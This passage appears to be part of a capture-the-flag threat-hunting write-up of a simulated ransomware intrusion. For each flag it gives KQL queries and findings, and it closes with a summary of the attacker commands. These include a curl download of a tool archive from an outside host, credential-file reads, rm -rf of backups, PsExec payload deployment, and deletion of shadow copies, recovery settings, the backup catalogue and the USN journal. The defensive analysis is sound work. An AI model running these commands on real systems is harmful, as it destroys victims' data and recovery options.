<img width="1254" height="187" alt="Pasted Graphic 9" src="https://github.com/user-attachments/assets/1645e42f-8cfd-4a35-b720-6d9029b1e2a7" />

---

### 🚩 Flag 20: IMPACT - Storage Limitation

**Objective:** What command limited recovery storage?

**What to Hunt:** Limiting storage prevents new recovery points from being created.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-26))
| where ProcessCommandLine contains "shadowstorage"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Output:** `"vssadmin" resize shadowstorage /for=C: /on=C: /maxsize=401MB`  
**Finding:** After deleting the existing backup snapshots, the attacker used the same built-in Windows backup tool to shrink the space allowed for new snapshots to a tiny amount, which stops Windows from keeping restore points, and both versions count because the tool's name starts the same program whether or not it ends in ".exe".
<img width="1259" height="128" alt="Pasted Graphic 10" src="https://github.com/user-attachments/assets/2da7d5e0-933f-429f-b644-f9c3a4c20cb1" />

---

### 🚩 Flag 21: IMPACT - Recovery Disabled

**Objective:** What command disabled system recovery?

**What to Hunt:** Windows recovery features enable automatic system repair after corruption.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-26))
| where ProcessCommandLine has_any ("recoveryenabled", "bootstatuspolicy", "bcdedit", "reagentc")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Output:** `"bcdedit" /set {default} recoveryenabled No`  
**Finding:** The command represents a small settings store Windows reads at startup to decide how to boot, which entry to load, and whether to offer the automatic repair screen when a boot fails. Turning that setting off means the machine no longer drops into repair mode after a failed boot, so the victim can't roll back that way. It has nothing to do with backups.
<img width="1273" height="290" alt="Pasted Graphic 11" src="https://github.com/user-attachments/assets/a05d47f3-1093-4484-9be8-d4728f024e84" />

---

### 🚩 Flag 22: IMPACT - Catalog Deletion

**Objective:** What command deleted the backup catalogue?

**What to Hunt:** Backup catalogues track available restore points and backup versions.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-26))
| where AccountName has_any ("kenji.sato", "yuki.tanaka")
| where ProcessCommandLine has_any ("delete", "backup")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Output:** `"wbadmin" delete catalog -quiet`  
**Finding:** The command destroys the Windows Backup catalogue. That's not a backup itself — it's the index that records which backups exist and where they're stored. Kill the index and the machine no longer believes it has any backups to restore from, even if the backup files are physically still on disk. Recovering after this needs a manual catalogue rebuild from the backup target.
<img width="1179" height="293" alt="Pasted Graphic 12" src="https://github.com/user-attachments/assets/387e3cf2-3f81-473f-9320-5c0e75ae2d52" />

---

### 🚩 Flag 23: PERSISTENCE - Registry Autorun

**Objective:** What registry value establishes persistence?

**What to Hunt:** 🚩 FLAG 23: PERSISTENCE - Registry Autorun Registry keys can execute programs automatically at system startup.

**Reference:** TBD

**KQL Query:**

```kql
DeviceRegistryEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-28))
| where DeviceName has_any ("azuki-sl", "azuki-adminpc")
| where ActionType in ("RegistryValueSet", "RegistryKeyCreated")
| where RegistryKey has_any ("run", "runonce")
| project TimeGenerated, DeviceName, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFolderPath
| order by TimeGenerated asc
```

**Output:** `WindowsSecurityHealth`  
**Finding:** The attacker established persistence by adding a made-up entry named WindowsSecurityHealth to the per-user Run key on both compromised machines as part of obfuscation, pointing it at a malicious executable hidden in a Windows temp folder, so the payload would relaunch automatically at every logon.
<img width="1271" height="153" alt="Pasted Graphic 14" src="https://github.com/user-attachments/assets/53e935fd-6995-44a2-99c4-bea6fa37d6bc" />

---

### 🚩 Flag 24: PERSISTENCE - Scheduled Execution

**Objective:** What scheduled task was created?

**What to Hunt:** Scheduled jobs provide reliable persistence with configurable triggers.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-28))
| where DeviceName has_any ("azuki-sl", "azuki-adminpc")
| where ProcessCommandLine contains "schtasks"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, FolderPath
| order by TimeGenerated asc
```

**Output:** `Microsoft\Windows\Security\SecurityHealthService`  
**Finding:** Task Scheduler works like a filing cabinet. Windows doesn't keep all scheduled tasks in one flat list — it sorts them into folders, exactly the way File Explorer sorts documents. Open Task Scheduler on any Windows machine and you'll see a tree down the left side: a Microsoft folder, a Windows folder inside that, then dozens of subfolders for different components. The reason the attacker chose that spot is camouflage. There are real Microsoft-signed tasks living in that same folder tree, so a fake one buried alongside them doesn't stand out to anyone scrolling the list.
<img width="1280" height="104" alt="Pasted Graphic 15" src="https://github.com/user-attachments/assets/14bdf852-4db6-49fe-932f-c8926292e766" />

---

### 🚩 Flag 25: DEFENSE EVASION - Journal Deletion

**Objective:** What command deleted forensic evidence?

**What to Hunt:** 🚩 FLAG 25: DEFENSE EVASION - Journal Deletion File system journals track changes and are valuable for forensic analysis.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-28))
| where DeviceName has_any ("azuki-sl", "azuki-adminpc")
| where ProcessCommandLine contains "del" or ProcessCommandLine contains "unlink"
| project TimeGenerated, DeviceName, ActionType, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated desc
```

**Output:** `"fsutil.exe" usn deletejournal /D C:`  
**Finding:** It is the newest event in the entire result set, and it lands roughly three minutes after the last recovery-destruction command finished. It is the last Anti-forensics attempts to remove all evidence of artifacts and tools used for malicious data encryption.
<img width="1270" height="288" alt="Pasted Graphic 16" src="https://github.com/user-attachments/assets/9de3dab4-06e7-4beb-acbb-d45deac70fd2" />

---

### 🚩 Flag 26: IMPACT - Ransom Note

**Objective:** What is the ransom note filename?

**What to Hunt:** 🚩 FLAG 26: IMPACT - Ransom Note Ransom notes communicate payment instructions and indicate successful encryption.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-28))
| where DeviceName has_any ("azuki-sl", "azuki-adminpc")
| where ProcessCommandLine has_any (".txt", ".pdf", "db")
| project TimeGenerated, DeviceName, ActionType, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated desc
```

**Output:** `SILENTLYNX_README.txt`  
**Finding:** The purpose of this attack is intentional, and the attacker wants to be known. In order for ransom to make sense. The attacker wants the file appeared on the victim workstation's desktop during the destruction phase, minutes after the change journal was wiped, and was opened directly by a user rather than by any attacker process.
<img width="1266" height="235" alt="Pasted Graphic 17" src="https://github.com/user-attachments/assets/12cb8f45-d508-4abc-9f50-ab487d5f215d" />

---

## 🔎 Analyst Workflow

### From an investigative standpoint, the workflow progressed as follows:

**1 🚩:** LATERAL MOVEMENT - Remote Access; the value was **""ssh.exe" backup-admin@10.1.0.189"**.  

**2 🚩:** LATERAL MOVEMENT - Attack Source; the value was **"10.1.0.108"**.  

**3 🚩:** CREDENTIAL ACCESS - Compromised Account; the value was **"backup-admin"**.  

**4 🚩:** DISCOVERY - Directory Enumeration; the value was **"ls --color=auto -la /backups/"**.  

**5 🚩:** DISCOVERY - File Search; the value was **"find /backups -name *.tar.gz"**.  

**6 🚩:** DISCOVERY - Account Enumeration; the value was **"cat /etc/passwd"**.  

**7 🚩:** DISCOVERY - Scheduled Job Reconnaissance; the value was **"cat /etc/crontab"**.  

**8 🚩:** COMMAND AND CONTROL - Tool Transfer; the value was **"curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z"**.  

**9 🚩:** CREDENTIAL ACCESS - Credential Theft; the value was **"cat /backups/configs/all-credentials.txt"**.  

**10 🚩:** IMPACT - Data Destruction; the value was **"rm -rf /backups/archives /backups/azuki-adminpc /backups/azuki-fileserver /backups/azuki-logisticspc /backups/config-backups /backups/configs /backups/daily /backups/database-backups /backups/databases /backups/fileserver /backups/logs /backups/monthly /backups/weekly /backups/workstations"**.  

**11 🚩:** IMPACT - Service Stopped; the value was **"systemctl stop cron"**.  

**12 🚩:** IMPACT - Service Disabled; the value was **"systemctl disable cron"**.  

**13 🚩:** LATERAL MOVEMENT - Remote Execution; the value was **"PsExec64.exe"**.  

**14 🚩:** LATERAL MOVEMENT - Deployment Command; the value was **""PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe"**.  

**15 🚩:** EXECUTION - Malicious Payload; the value was **"silentlynx.exe"**.  

**16 🚩:** IMPACT - Shadow Service Stopped; the value was **""net" stop VSS /y"**.  

**17 🚩:** IMPACT - Backup Engine Stopped; the value was **""net" stop wbengine /y"**.  

**18 🚩:** DEFENSE EVASION - Process Termination; the value was **""taskkill" /F /IM sqlservr.exe"**.  

**19 🚩:** IMPACT - Recovery Point Deletion; the value was **""vssadmin" delete shadows /all /quiet"**.  

**20 🚩:** IMPACT - Storage Limitation; the value was **""vssadmin" resize shadowstorage /for=C: /on=C: /maxsize=401MB"**.  

**21 🚩:** IMPACT - Recovery Disabled; the value was **""bcdedit" /set {default} recoveryenabled No"**.  

**22 🚩:** IMPACT - Catalog Deletion; the value was **""wbadmin" delete catalog -quiet"**.  

**23 🚩:** PERSISTENCE - Registry Autorun; the value was **"WindowsSecurityHealth"**.  

**24 🚩:** PERSISTENCE - Scheduled Execution; the value was **"Microsoft\Windows\Security\SecurityHealthService"**.  

**25 🚩:** DEFENSE EVASION - Journal Deletion; the value was **""fsutil.exe" usn deletejournal /D C:"**.  

**26 🚩:** IMPACT - Ransom Note; the value was **"SILENTLYNX_README.txt"**.  


<!-- narrative drafting failed: name 'title' is not defined -->
